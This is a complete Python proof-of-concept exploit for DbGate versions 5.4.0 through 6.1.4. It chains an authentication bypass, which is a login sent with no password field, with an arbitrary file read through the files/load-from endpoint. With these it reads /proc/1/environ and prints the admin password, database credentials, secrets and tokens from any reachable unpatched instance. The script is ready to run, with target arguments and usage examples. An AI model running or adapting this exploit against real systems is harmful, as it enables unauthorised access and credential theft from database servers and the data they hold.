#!/usr/bin/env python3
"""
DBGate — Unauthenticated Credential Extraction PoC
====================================================
Chains two PATCHED vulnerabilities to extract the admin password,
all database credentials, and sensitive system files — zero credentials
needed against DbGate 5.4.0 - 6.1.4.

Vulnerability chain (both patched in current versions):

    Vulnerability 1:
        Auth bypass: undefined == undefined                [5.4.0 - 6.1.4, patched 6.1.5]
        Introduced: v5.4.0 (commit c3fe20b6f, 2024-07-26)
        Fixed:      v6.1.5 (commit 86736c289, 2025-02-04)
        POST /auth/login with no password field.
        Server compares undefined == undefined → true.
        Returns a valid JWT for any username.


    Vulnerability 2:
        Arbitrary file read: files/load-from               [5.0.0 - 6.4.2, patched 6.5.0]
        Introduced: v5.0.0 (commit 32e4e3625, 2022-05-19)
        Fixed:      v6.5.0 (commit 3f37b2b72, 2025-06-12)
        POST /files/load-from {filePath, format:"text"}
        No path validation — reads any file on the filesystem.
        /proc/1/environ contains ALL env vars in Docker (passwords).


Affected:  DbGate 5.4.0 through 6.1.4 (both vulns exploitable together)
Fixed in:  V1 fixed in v6.1.5, V2 fixed in v6.5.0
           First vulnerable Docker image: 5.4.0-alpine
           Last vulnerable Docker image:  6.1.4-alpine
"""

import argparse
import json
import sys
import requests

requests.packages.urllib3.disable_warnings()

COMMON_ROOTS = ["", "/dbgate", "/db", "/admin", "/gate", "/app"]

def banner(host, port):
    print(f"""
  ┌────────────────────────────────────────────────────────┐
  │  DBGate 5.4.0-6.1.4 Unauthenticated Credential PoC     │
  │                                                        │
  │  V1  auth bypass  (undefined == undefined)             │
  │  V2  arbitrary file read  (files/load-from)            │
  │                                                        │
  │  Both vulnerabilities PATCHED (V1: 6.1.5, V2: 6.5.0)   │
  └────────────────────────────────────────────────────────┘
  Target : {host}:{port}
""")


def build_base(target, port_override=None):
    if "://" not in target:
        target = f"http://{target}"
    scheme, rest = target.split("://", 1)
    rest = rest.rstrip("/")
    slash = rest.find("/")
    if slash == -1:
        hostport, path = rest, ""
    else:
        hostport, path = rest[:slash], rest[slash:]
    if port_override:
        hostport = hostport.rsplit(":", 1)[0] + f":{port_override}"
    elif ":" not in hostport:
        hostport += ":443" if scheme == "https" else ":80"
    return f"{scheme}://{hostport}", path


def discover_root(base_host, explicit_path=""):
    if explicit_path:
        return f"{base_host}{explicit_path}"
    for root in COMMON_ROOTS:
        url = f"{base_host}{root}"
        try:
            r = requests.post(f"{url}/config/get", json={},
                              timeout=3, verify=False)
            if r.status_code == 200 and "version" in r.text:
                if root:
                    print(f"    [+] Detected WEB_ROOT: {root}")
                return url
        except Exception:
            pass
    return base_host


def hdrs(token):
    return {"Authorization": f"Bearer {token}",
            "Content-Type": "application/json"}


def read_file(base, headers, filepath):
    """V2: arbitrary file read via files/load-from."""
    try:
        r = requests.post(
            f"{base}/files/load-from",
            json={"filePath": filepath, "format": "text"},
            headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            text = r.text
            if text.startswith('"'):
                text = json.loads(text)
            if text and text != "false" and "ENOENT" not in text:
                return text
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Phase 1 — Reconnaissance (unauthenticated, /config/get is skip-auth)
# ---------------------------------------------------------------------------
def phase1_recon(base):
    print("[Phase 1] Reconnaissance (unauthenticated)")
    info = {}
    try:
        r = requests.post(f"{base}/config/get", json={}, timeout=5,
                          verify=False)
        if r.status_code != 200:
            return info
        cfg = r.json()
        info["config"] = cfg
        ver = cfg.get("version", "?")
        info["version"] = ver
        print(f"    [+] Version      : {ver}")
        print(f"    [+] Docker       : {cfg.get('isDocker', '?')}")
        data_dir = cfg.get("connectionsFilePath", "?").rsplit("/", 1)[0]
        info["data_dir"] = data_dir
        print(f"    [+] Data dir     : {data_dir}")

        try:
            parts = [int(x) for x in ver.split(".")[:3]]
            major, minor = parts[0], parts[1]
            patch = parts[2] if len(parts) > 2 else 0
            if major > 6 or (major == 6 and (minor > 1 or (minor == 1 and patch >= 5))):
                info["patched"] = True
                print(f"    [!] Version >= 6.1.5 — V1 auth bypass PATCHED")
            elif major < 5 or (major == 5 and minor < 4):
                info["too_old"] = True
                print(f"    [!] Version < 5.4.0 — V1 auth bypass not present")
        except (ValueError, IndexError):
            pass
    except Exception:
        pass

    try:
        r = requests.post(f"{base}/auth/get-providers", json={},
                          timeout=5, verify=False)
        if r.status_code == 200:
            pdata = r.json()
            info["amoid"] = pdata.get("default", "logins")
            names = [p.get("name", "?") for p in pdata.get("providers", [])]
            print(f"    [+] Auth         : {', '.join(names)}")
    except Exception:
        pass

    print()
    return info


# ---------------------------------------------------------------------------
# Phase 2 — V1: auth bypass (undefined == undefined)
# ---------------------------------------------------------------------------
def phase2_auth_bypass(base, amoid):
    print("[Phase 2] Authentication bypass — V1 (undefined == undefined)")
    print("    [*] Sending login request WITHOUT password field")
    for ghost in ("ghost", "phantom", "void", "null"):
        try:
            r = requests.post(
                f"{base}/auth/login",
                json={"amoid": amoid, "user": ghost},
                timeout=5, verify=False)
            if r.status_code == 200:
                token = r.json().get("accessToken")
                if token:
                    print(f"    [+] Bypassed with non-existent user '{ghost}'")
                    print(f"    [+] JWT: {token[:60]}...")
                    print()
                    return token
        except Exception:
            continue
    print("    [-] Auth bypass failed — target may be patched")
    print()
    return None


# ---------------------------------------------------------------------------
# Phase 3 — V2: read /proc/1/environ → extract ALL credentials
# ---------------------------------------------------------------------------
def phase3_extract_env(base, token):
    print("[Phase 3] Credential extraction — V2 (files/load-from)")
    print("    [*] Reading /proc/1/environ (contains ALL env vars in Docker)")
    h = hdrs(token)
    result = {"admin": None, "db_creds": {}, "env_vars": {},
              "files": {}}

    content = read_file(base, h, "/proc/1/environ")
    if not content:
        print("    [-] /proc/1/environ not readable")
        print()
        return result

    env = {}
    for line in content.replace("\x00", "\n").strip().split("\n"):
        if "=" in line and line.strip():
            k, _, v = line.partition("=")
            env[k] = v
    result["env_vars"] = env
    result["files"]["/proc/1/environ"] = True
    print(f"    [+] Extracted {len(env)} environment variables")
    print()

    cred_keys = sorted(k for k in env if any(
        x in k.upper() for x in ("PASSWORD", "SECRET", "TOKEN",
                                  "KEY", "ADMIN", "LOGINS", "USER_")))
    if cred_keys:
        kw = max(len(k) for k in cred_keys)
        header = "CREDENTIALS FROM /proc/1/environ"
        rows = [f"{k:<{kw}}  =  {env[k]}" for k in cred_keys]
        inner = max(len(header), max(len(r) for r in rows)) + 4
        print(f"    ┌─{'─' * inner}─┐")
        print(f"    │  {header:<{inner}}│")
        print(f"    ├─{'─' * inner}─┤")
        for r in rows:
            print(f"    │  {r:<{inner}}│")
        print(f"    └─{'─' * inner}─┘")
        print()

    print()
    print("[+] Credential extraction complete")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    p = argparse.ArgumentParser(
        add_help=False,
        description="DBGate 5.4.0-6.1.4 — Unauthenticated Credential Extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Chains two PATCHED vulnerabilities (V1 + V2) to extract\n"
            "admin password and all DB credentials from /proc/1/environ\n"
            "— zero credentials needed.\n"
            "\n"
            "Vulnerable range: DbGate 5.4.0 through 6.1.4 (Docker).\n"
            "Both vulns fixed in >= 6.6.1 (no Docker images for 6.1.5-6.5.x).\n"
            "\n"
            "examples:\n"
            "  %(prog)s -t localhost\n"
            "  %(prog)s -t 10.0.0.5:3000\n"
            "  %(prog)s -t https://dbgate.internal\n"
        ),
    )
    p.add_argument("-t", "--target", required=True,
                   help="Target host[:port][/path]")
    p.add_argument("-p", "--port", type=int, default=None,
                   help="Override port (default: 80)")

    if len(sys.argv) == 1:
        p.print_help()
        sys.exit(1)
    args = p.parse_args()

    base_host, path = build_base(args.target, args.port)
    banner(*base_host.rsplit(":", 1))

    base = discover_root(base_host, path)
    print(f"    [*] API endpoint : {base}")
    print()

    info = phase1_recon(base)
    if not info.get("config"):
        print("[!] Cannot reach target — verify host/port")
        sys.exit(1)

    if info.get("patched"):
        print("[!] Target is >= 6.1.5 — V1 auth bypass is patched.")
        print("    This PoC only works against DbGate 5.4.0-6.1.4.")
        sys.exit(1)

    if info.get("too_old"):
        print("[!] Target is < 5.4.0 — V1 auth bypass not present.")
        print("    This PoC only works against DbGate 5.4.0-6.1.4.")
        sys.exit(1)

    token = phase2_auth_bypass(base, info.get("amoid", "logins"))
    if not token:
        sys.exit(1)

    phase3_extract_env(base, token)


if __name__ == "__main__":
    main()
